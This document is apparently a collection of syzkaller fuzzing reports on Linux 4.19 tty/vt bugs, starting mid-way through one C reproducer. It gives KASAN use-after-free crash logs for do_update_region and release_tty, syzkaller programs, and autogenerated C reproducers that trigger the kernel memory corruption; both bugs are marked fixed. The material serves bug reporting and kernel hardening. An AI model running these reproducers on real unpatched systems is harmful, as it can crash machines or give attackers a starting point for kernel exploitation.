memcpy((void*)0x20000000, "\x81\x58\x1f\x65\x2b\xc6\x61\x38\xdb\xc5\x8a\xb5\x31\x0e\xee\x6f\x82\x7f\x84\xac\x66\x60\xef\x3d\xd8\xa9\x0d\x73\x9f\x7c\xa3\x0b\xaf\x46\xfd\x82\x5d\xb0\xcd\xef\x14\x0d\x7b\x25\xbb\x80\x20\x58\x36\x0f\x21\x02\x16\x96\x5d\x6e\x01\x29\xad\x01\xa2\xfa\x42\xaf\x09\x2a\x6d\x9e\x8f\xdd\x41\x19\x49\xdb\xd8\x88\x04\x25\xeb\x0c\xc1\xc4\x89\x05\x74\x32\xa4\x86\xda\x05\xf2\xb2\x03\x89\x29\xd6\xaa\x48\x4c\x93\xc1\xe0\x83\xbc\x09\x98\xd3\x99\x19\x08\xad\xd4\xa0\xe4\xc3\x9e\x05\xf7\x25\x0f\x45\x1d\x72\x65\x49\xfc\x6e\x83\x36\xae\x67\xd0\x39\x3d\xc2\xe3\x4b\x2e\x71\x66\x5d\x9a\xea\x09\xc3\xd7\x73\x04\xb5\xcb\xaf\xfd\x3e\xbe\xf9\x55\x27\xc8\xf8\x7a\x92\xbf\x71\x60\x14\x1b\x66\x31\xa7\x75\x3f\x89\x60\x5d\xfc\x97\x4e\x7f\x51\xe9\x71\x80\x1c\x82\x15\x9f\xa3\x43\xd5\x9e\x59\x12\xb6\x32\x78\x2a\xff\x05\x71\xa4\xc2\xca\xa7\x7b\xe3\x6a\x71\x11\xea\x23\x88\x3e\xe5\x64\x2a\x12\x2b\x77\xb2\xa2\xa8\x68\x69\xb8\x0e\xb2\x86\x3a\x98\x7b\x70\xc7", 232);
*(uint64_t*)0x200003c8 = 0xe8;
*(uint64_t*)0x200003d0 = 0;
*(uint64_t*)0x200003d8 = 0;
*(uint64_t*)0x200003e0 = 0;
*(uint64_t*)0x200003e8 = 0;
*(uint64_t*)0x200003f0 = 0;
*(uint64_t*)0x200003f8 = 0;
*(uint64_t*)0x20000400 = 0;
*(uint64_t*)0x20000408 = 0;
*(uint64_t*)0x20000410 = 0;
*(uint64_t*)0x20000418 = 0;
*(uint64_t*)0x20000420 = 0;
*(uint64_t*)0x20000428 = 0;
	syscall(__NR_writev, r[1], 0x200003c0ul, 7ul);
 
}
int main(void)
{
		syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
			loop();
	return 0;
}
 ```

# Syzkaller hit 'KASAN: use-after-free Read in do_update_region' bug. (Fixed [fix a UAF in do_update_region()](https://lkml.org/lkml/2020/6/4/532))
 
 ```
audit: type=1400 audit(1608122498.861:8): avc:  denied  { execmem } for  pid=1875 comm="syz-executor929" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:system_r:kernel_t:s0 tclass=process permissive=1
==================================================================
BUG: KASAN: use-after-free in do_update_region+0x529/0x5d0 drivers/tty/vt/vt.c:665
Read of size 2 at addr ffff888000100000 by task systemd/1
 
CPU: 0 PID: 1 Comm: systemd Not tainted 4.19.31 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.13.0-48-gd9c812dda519-prebuilt.qemu.org 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:77 [inline]
 dump_stack+0x8c/0xce lib/dump_stack.c:113
 print_address_description+0x65/0x270 mm/kasan/report.c:256
 kasan_report_error mm/kasan/report.c:354 [inline]
 kasan_report+0x253/0x380 mm/kasan/report.c:412
 do_update_region+0x529/0x5d0 drivers/tty/vt/vt.c:665
 update_region+0x13e/0x180 drivers/tty/vt/vt.c:695
 csi_J+0x2d9/0x9b0 drivers/tty/vt/vt.c:1524
 do_con_trol+0x5137/0x5740 drivers/tty/vt/vt.c:2340
 do_con_write.part.27+0x550/0x1ae0 drivers/tty/vt/vt.c:2765
 do_con_write drivers/tty/vt/vt.c:3106 [inline]
 con_write+0xa7/0xc0 drivers/tty/vt/vt.c:3102
 process_output_block drivers/tty/n_tty.c:593 [inline]
 n_tty_write+0x4f0/0xd20 drivers/tty/n_tty.c:2331
 do_tty_write drivers/tty/tty_io.c:958 [inline]
 tty_write+0x42f/0x890 drivers/tty/tty_io.c:1042
 __vfs_write+0xea/0x5f0 fs/read_write.c:485
 vfs_write+0x168/0x490 fs/read_write.c:549
 ksys_write+0xbb/0x190 fs/read_write.c:598
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x7fc3a39751b0
Code: 2e 0f 1f 84 00 00 00 00 00 90 48 8b 05 19 7e 20 00 c3 0f 1f 84 00 00 00 00 00 83 3d 19 c2 20 00 00 75 10 b8 01 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 31 c3 48 83 ec 08 e8 ae fc ff ff 48 89 04 24
RSP: 002b:00007fff4ec1f1b8 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
RAX: ffffffffffffffda RBX: 000000000000000a RCX: 00007fc3a39751b0
RDX: 000000000000000a RSI: 00007fc3a4de0cbe RDI: 0000000000000013
RBP: 00007fc3a4de0cbe R08: 00007fff4ec1f170 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000013
R13: 0000000000000000 R14: ffffffffffffffff R15: 000056278d14e5b0
 
The buggy address belongs to the page:
page:ffffea0000004000 count:0 mapcount:-128 mapping:0000000000000000 index:0x0
flags: 0x0()
raw: 0000000000000000 ffff88803ffdc300 ffff88803ffdc300 0000000000000000
raw: 0000000000000000 0000000000000008 00000000ffffff7f 0000000000000000
page dumped because: kasan: bad access detected
 
Memory state around the buggy address:
 ffff8880000fff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff8880000fff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>ffff888000100000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
                   ^
 ffff888000100080: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
 ffff888000100100: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
==================================================================
 ```
 
## Syzkaller reproducer:
```
{Threaded:false Collide:false Repeat:false RepeatTimes:0 Procs:1 Sandbox: Fault:false FaultCall:-1 FaultNth:0 Leak:false NetInjection:false NetDevices:false NetReset:false Cgroups:false BinfmtMisc:false CloseFDs:false KCSAN:false DevlinkPCI:false USB:false VhciInjection:false Wifi:false Sysctl:false UseTmpDir:false HandleSegv:false Repro:false Trace:false}
r0 = syz_open_dev$tty20(0xc, 0x4, 0x0)
ioctl$VT_RESIZE(r0, 0x5609, &(0x7f0000000440)={0x774, 0x0, 0x6})
r1 = syz_open_dev$tty1(0xc, 0x4, 0x1)
ioctl$TIOCVHANGUP(r1, 0x5437, 0x0)
 ```
 
## C reproducer:
> autogenerated by syzkaller (https://github.com/google/syzkaller)
 
 ```
#define _GNU_SOURCE 
 
#include <endian.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
 
static long syz_open_dev(volatile long a0, volatile long a1, volatile long a2)
{
	if (a0 == 0xc || a0 == 0xb) {
		char buf[128];
		sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1, (uint8_t)a2);
		return open(buf, O_RDWR, 0);
	} else {
		char buf[1024];
		char* hash;
		strncpy(buf, (char*)a0, sizeof(buf) - 1);
		buf[sizeof(buf) - 1] = 0;
		while ((hash = strchr(buf, '#'))) {
			*hash = '0' + (char)(a1 % 10);
			a1 /= 10;
		}
		return open(buf, a2, 0);
	}
}
 
uint64_t r[2] = {0xffffffffffffffff, 0xffffffffffffffff};
 
int main(void)
{
		syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
				intptr_t res = 0;
	res = -1;
res = syz_open_dev(0xc, 4, 0x14);
	if (res != -1)
		r[0] = res;
*(uint16_t*)0x20000440 = 0x774;
*(uint16_t*)0x20000442 = 0;
*(uint16_t*)0x20000444 = 6;
	syscall(__NR_ioctl, r[0], 0x5609, 0x20000440ul);
	res = -1;
res = syz_open_dev(0xc, 4, 1);
	if (res != -1)
		r[1] = res;
	syscall(__NR_ioctl, r[1], 0x5437, 0ul);
	return 0;
}
 ```

# Syzkaller hit 'KASAN: use-after-free Write in release_tty' bug. (Fixed [KASAN: use-after-free Write in release_tty](https://lkml.org/lkml/2019/12/3/767))
 
 ```
audit: type=1400 audit(1608293109.664:8): avc:  denied  { execmem } for  pid=1877 comm="syz-executor804" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:system_r:kernel_t:s0 tclass=process permissive=1
==================================================================
BUG: KASAN: use-after-free in con_shutdown+0x78/0x90 drivers/tty/vt/vt.c:3245
Write of size 8 at addr ffff88802c2750b8 by task syz-executor804/1882
 
CPU: 0 PID: 1882 Comm: syz-executor804 Not tainted 4.19.31 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.13.0-48-gd9c812dda519-prebuilt.qemu.org 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:77 [inline]
 dump_stack+0x8c/0xce lib/dump_stack.c:113
 print_address_description+0x65/0x270 mm/kasan/report.c:256
 kasan_report_error mm/kasan/report.c:354 [inline]
 kasan_report+0x253/0x380 mm/kasan/report.c:412
 con_shutdown+0x78/0x90 drivers/tty/vt/vt.c:3245
 release_tty+0xc4/0x480 drivers/tty/tty_io.c:1507
 tty_release_struct+0x32/0x40 drivers/tty/tty_io.c:1622
 tty_release+0xa37/0xf70 drivers/tty/tty_io.c:1782
 __fput+0x25f/0x6e0 fs/file_table.c:278
 task_work_run+0x151/0x1c0 kernel/task_work.c:113
 exit_task_work include/linux/task_work.h:22 [inline]
 do_exit+0x7ac/0x2a50 kernel/exit.c:875
 do_group_exit+0xed/0x320 kernel/exit.c:978
 __do_sys_exit_group kernel/exit.c:989 [inline]
 __se_sys_exit_group kernel/exit.c:987 [inline]
 __x64_sys_exit_group+0x3a/0x50 kernel/exit.c:987
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x449c06
Code: Bad RIP value.
RSP: 002b:00007ffdc63351b8 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
RAX: ffffffffffffffda RBX: 00000000006bd450 RCX: 0000000000449c06
RDX: 0000000000000000 RSI: 000000000000003c RDI: 0000000000000000
RBP: 0000000000000000 R08: 00000000000000e7 R09: ffffffffffffffc0
R10: 0000000000000000 R11: 0000000000000246 R12: 00000000006bd450
R13: 0000000000000001 R14: 0000000000000000 R15: 0000000000000001
 
Allocated by task 1882:
 set_track mm/kasan/kasan.c:460 [inline]
 kasan_kmalloc+0xa0/0xd0 mm/kasan/kasan.c:553
 kmem_cache_alloc_trace+0x65/0x180 mm/slub.c:2733
 kmalloc include/linux/slab.h:513 [inline]
 kzalloc include/linux/slab.h:707 [inline]
 vc_allocate+0x1e1/0x5d0 drivers/tty/vt/vt.c:1081
 con_install+0x4f/0x3e0 drivers/tty/vt/vt.c:3196
 tty_driver_install_tty drivers/tty/tty_io.c:1224 [inline]
 tty_init_dev+0xe9/0x490 drivers/tty/tty_io.c:1337
 tty_open_by_driver drivers/tty/tty_io.c:1979 [inline]
 tty_open+0x675/0xaf0 drivers/tty/tty_io.c:2027
 chrdev_open+0x208/0x510 fs/char_dev.c:417
 do_dentry_open+0x7bd/0xe90 fs/open.c:771
 do_last fs/namei.c:3418 [inline]
 path_openat+0x858/0x3e50 fs/namei.c:3533
 do_filp_open+0x1a5/0x2b0 fs/namei.c:3564
 do_sys_open+0x302/0x430 fs/open.c:1063
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
 
Freed by task 1885:
 set_track mm/kasan/kasan.c:460 [inline]
 __kasan_slab_free+0x130/0x180 mm/kasan/kasan.c:521
 slab_free_hook mm/slub.c:1371 [inline]
 slab_free_freelist_hook mm/slub.c:1398 [inline]
 slab_free mm/slub.c:2953 [inline]
 kfree+0x8b/0x1a0 mm/slub.c:3906
 vt_disallocate_all+0x259/0x370 drivers/tty/vt/vt_ioctl.c:323
 vt_ioctl+0x153a/0x24a0 drivers/tty/vt/vt_ioctl.c:816
 tty_ioctl+0x26f/0x1330 drivers/tty/tty_io.c:2667
 vfs_ioctl fs/ioctl.c:46 [inline]
 do_vfs_ioctl+0x1a0/0xfb0 fs/ioctl.c:690
 ksys_ioctl+0x84/0x90 fs/ioctl.c:705
 __do_sys_ioctl fs/ioctl.c:712 [inline]
 __se_sys_ioctl fs/ioctl.c:710 [inline]
 __x64_sys_ioctl+0x6f/0xb0 fs/ioctl.c:710
 do_syscall_64+0xa0/0x2c0 arch/x86/entry/common.c:290
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
 
The buggy address belongs to the object at ffff88802c275030
 which belongs to the cache kmalloc-1024 of size 1024
The buggy address is located 136 bytes inside of
 1024-byte region [ffff88802c275030, ffff88802c275430)
The buggy address belongs to the page:
page:ffffea0000b09c00 count:1 mapcount:0 mapping:ffff888035c02f40 index:0xffff88802c275588 compound_mapcount: 0
flags: 0x100000000008100(slab|head)
raw: 0100000000008100 ffffea0000c88608 ffff888035c01c50 ffff888035c02f40
raw: ffff88802c275588 000000000017000f 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected
 
Memory state around the buggy address:
 ffff88802c274f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff88802c275000: fc fc fc fc fc fc fb fb fb fb fb fb fb fb fb fb
>ffff88802c275080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                                        ^
 ffff88802c275100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
 ffff88802c275180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
==================================================================
 ```
 
## Syzkaller reproducer:
```
{Threaded:false Collide:false Repeat:true RepeatTimes:0 Procs:4 Sandbox: Fault:false FaultCall:-1 FaultNth:0 Leak:false NetInjection:false NetDevices:false NetReset:false Cgroups:false BinfmtMisc:false CloseFDs:false KCSAN:false DevlinkPCI:false USB:false VhciInjection:false Wifi:false Sysctl:false UseTmpDir:false HandleSegv:false Repro:false Trace:false}
r0 = syz_open_dev$tty20(0xc, 0x4, 0x0)
ioctl$VT_DISALLOCATE(r0, 0x5608)
 ```
 
## C reproducer:
> autogenerated by syzkaller (https://github.com/google/syzkaller)
 
 ```
#define _GNU_SOURCE 
 
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
 
static unsigned long long procid;
 
static void sleep_ms(uint64_t ms)
{
	usleep(ms * 1000);
}
 
static uint64_t current_time_ms(void)
{
	struct timespec ts;
	if (clock_gettime(CLOCK_MONOTONIC, &ts))
	exit(1);
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}
 
static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		int err = errno;
		close(fd);
		errno = err;
		return false;
	}
	close(fd);
	return true;
}
 
static long syz_open_dev(volatile long a0, volatile long a1, volatile long a2)
{
	if (a0 == 0xc || a0 == 0xb) {
		char buf[128];
		sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1, (uint8_t)a2);
		return open(buf, O_RDWR, 0);
	} else {
		char buf[1024];
		char* hash;
		strncpy(buf, (char*)a0, sizeof(buf) - 1);
		buf[sizeof(buf) - 1] = 0;
		while ((hash = strchr(buf, '#'))) {
			*hash = '0' + (char)(a1 % 10);
			a1 /= 10;
		}
		return open(buf, a2, 0);
	}
}
 
static void kill_and_wait(int pid, int* status)
{
	kill(-pid, SIGKILL);
	kill(pid, SIGKILL);
	for (int i = 0; i < 100; i++) {
		if (waitpid(-1, status, WNOHANG | __WALL) == pid)
			return;
		usleep(1000);
	}
	DIR* dir = opendir("/sys/fs/fuse/connections");
	if (dir) {
		for (;;) {
			struct dirent* ent = readdir(dir);
			if (!ent)
				break;
			if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
				continue;
			char abort[300];
			snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort", ent->d_name);
			int fd = open(abort, O_WRONLY);
			if (fd == -1) {
				continue;
			}
			if (write(fd, abort, 1) < 0) {
			}
			close(fd);
		}
		closedir(dir);
	} else {
	}
	while (waitpid(-1, status, __WALL) != pid) {
	}
}
 
static void setup_test()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	write_file("/proc/self/oom_score_adj", "1000");
}
 
static void execute_one(void);
 
#define WAIT_FLAGS __WALL
 
static void loop(void)
{
	int iter = 0;
	for (;; iter++) {
		int pid = fork();
		if (pid < 0)
	exit(1);
		if (pid == 0) {
			setup_test();
			execute_one();
			exit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
				break;
			sleep_ms(1);
			if (current_time_ms() - start < 5 * 1000)
				continue;
			kill_and_wait(pid, &status);
			break;
		}
	}
}
 
uint64_t r[1] = {0xffffffffffffffff};
 
void execute_one(void)
{
		intptr_t res = 0;
	res = -1;
res = syz_open_dev(0xc, 4, 0x14 + procid*2);
	if (res != -1)
		r[0] = res;
	syscall(__NR_ioctl, r[0], 0x5608, 0);
 
}
int main(void)
{
		syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
	syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
	for (procid = 0; procid < 4; procid++) {
		if (fork() == 0) {
			loop();
		}
	}
	sleep(1000000);
	return 0;
}
 ```
